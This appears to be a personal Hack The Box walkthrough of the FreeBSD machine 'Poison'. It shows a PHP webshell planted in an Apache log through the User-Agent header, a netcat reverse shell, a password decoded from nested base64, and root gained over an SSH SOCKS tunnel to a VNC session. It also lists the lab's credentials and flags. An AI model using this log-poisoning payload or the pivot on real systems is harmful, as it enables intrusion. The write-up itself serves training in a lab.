Started: 04-07-25 | 09:27
Ended: 05-07-25 | 11:54

#CTF/HTB/Linux/Medium

# Given

Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.

## IP

10.10.10.84

# Steps

## Enumeration

- Checked for open ports first using Rustscan.

![](Assets/Pasted%20image%2020250704094124.png)

- Only ports open are the http port and ssh port. We use this to narrow down on what ports to scan on nmap. However as a matter of good practice, I still run a full port scan in the background. 
- The nmap scan of these two open ports shows us that we have an Apache server running FreeBSD.

![](Assets/Pasted%20image%2020250704101724.png)

- The next part would be to test the web server. Its a basic form based input, there's nothing else on the surface. It seems to be a site that tests php scripts.
- I got led to burpsuite almost immediately, and started looking at how the requests worked for the site. Since the description of this box mentioned log poisoning, I zeroed in on that aspect, and tried to access the `access.log` file.
- I noticed that OS was FreeBSD, and the default location for the `access.log` file is `/var/log/httpd-access.log`. 
- Knowing this, I started trying to poison the log files using burpsuite's repeater.

## Exploitation

```http
GET / HTTP/1.1
Host: 10.10.10.84
User-Agent: n0m4d; <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

- This gave me a webshell that I used to try and traverse the file system to an extent.
- The next step was to try and create a reverse shell to my machine. For that I made  use of [revshells](revshells.com).

## Foothold

![](Assets/Pasted%20image%2020250704194345.png)

- I then URL encoded it, and dropped that into burpsuite while I had a netcat listener running on my host.

![](Assets/Pasted%20image%2020250704161156.png)

![](Assets/Pasted%20image%2020250704160401.png)

- Once I had a reverse shell, I grabbed that and started looking into `/etc/passwd` . Found another user on here called `charix`.
- I started looking through the files, and there was one of particular interest. I was `pwdbackup.txt`. This had something in it that was encoded about 13 times based on the disclaimer.

```plaintext fold title:pwdbackup.txt
Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=
```

- I didn't want to run the `base64 -d` command a bunch of times, so I did the next best thing. [Cyberchef](https://gchq.github.io/CyberChef/). Did 13 rounds of base64 decoding to hopefully get the password to charix's account.

![](Assets/Pasted%20image%2020250704161429.png)

- Tested that by trying to ssh into the box as charix. Turns out it works! 

![](Assets/Pasted%20image%2020250704161852.png)

- The user flag was on the desktop, along with a zip file called `secret.zip`

![](Assets/Pasted%20image%2020250704161852.png)

## Privesc

- Went down the linux privesc checklist, and when I got to network information I ran `netstat -a` and got the following output

```shell
charix@Poison:~ % netstat -a                                                      
Active Internet connections (including servers) 
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)         
                       
tcp4       0      0 10.10.10.84.ssh        10.10.14.35.53924 ESTABLISHED     
tcp4       0      0 localhost.smtp         *.*        LISTEN
tcp4       0      0 *.http                 *.*        LISTEN          
tcp6       0      0 *.http                 *.*        LISTEN
tcp4       0      0 *.ssh                  *.*        LISTEN          
tcp6       0      0 *.ssh                  *.*        LISTEN
tcp4       0      0 localhost.5801         *.*        LISTEN          
tcp4       0      0 localhost.5901         *.*        LISTEN
udp4       0      0 *.syslog               *.* 
udp6       0      0 *.syslog               *.*
```

- I noticed 2 ports listening in on localhost, and these weren't standard. Ports 5801 and 5901 are VNC (Virtual Network Computing) ports.
- I need to check out the process details for the VNC service, because hopefully its run by root, and I can hop onto it to escalate my current privileges.

```shell
charix@Poison:~ % ps -auwwx | grep vnc
root   529   0.0  0.9 23620  8872 v0- I    04:29    0:00.01 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -
rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
charix 813   0.0  0.0   412   328  1  R+   05:06    0:00.00 grep vnc
```

- There's an issue here though because VNC is a GUI based service, and I can't run it through the shell I have as charix. So the process here would be:
	- Use charix as a pivot.
	- Forward the VNC network traffic to my host machine so I can see what's going on. 
- In order to do this over SSH, I have to modify my `/etc/proxychains.conf` file by adding a socks proxy port for me to forward traffic from charix.
	- `socks4 127.0.0.1 8081`
- Next, I have to ssh into charix, and forward traffic to port 8081
	- `ssh charix@10.10.10.84 -D 8081`
- Finally, I have to get the `secret.zip` file onto my attacking host, unzip it using Charix's password, and use it to run vncviewer through proxtychains. A simplified diagram looks something like this:

![](Assets/Pasted%20image%2020250705134503.png)

- The code for running vncviewer via proxychains is below:

```shell
proxychains vncviewer 10.10.10.84:5901 -passwd ./secret
```

- This opens up a vncviewer session on our kali attacking host, with an open terminal. We can use that terminal to look for the root flag.

# Creds

- Low level creds:
	- charix : Charix!2#4%6&8(0
- secret.zip

# Flags

user: eaacdfb2d141b72a589233063604209c
root: 716d04b188419cf2bb99d891272361f5

# Proof

![](Assets/Pasted%20image%2020250704161905.png)

![](Assets/Pasted%20image%2020250705115230.png)